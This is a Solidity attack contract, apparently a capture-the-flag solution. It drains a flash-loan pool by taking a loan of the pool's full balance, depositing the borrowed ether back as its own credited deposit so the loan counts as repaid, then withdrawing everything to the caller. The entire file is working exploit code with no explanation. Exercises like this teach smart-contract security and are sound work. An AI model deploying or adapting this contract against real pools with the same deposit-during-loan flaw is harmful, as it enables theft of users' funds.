// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Ivault {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract AttackSideEntrance {
    address private pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function attack() external {
        // take balance of bool
        uint256 balanceOfPool = pool.balance;
        // execute flashloan
        Ivault(pool).flashLoan(balanceOfPool);
        // Withdraw all fund
        Ivault(pool).withdraw();
        // transfer Fund to msg.sender
        // (bool success, ) = tx.origin.call{value: address(this).balance}("");
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Hack Faild");
    }

    function execute() external payable {
        Ivault(pool).deposit{value: msg.value}();
    }

    receive() external payable {}
}
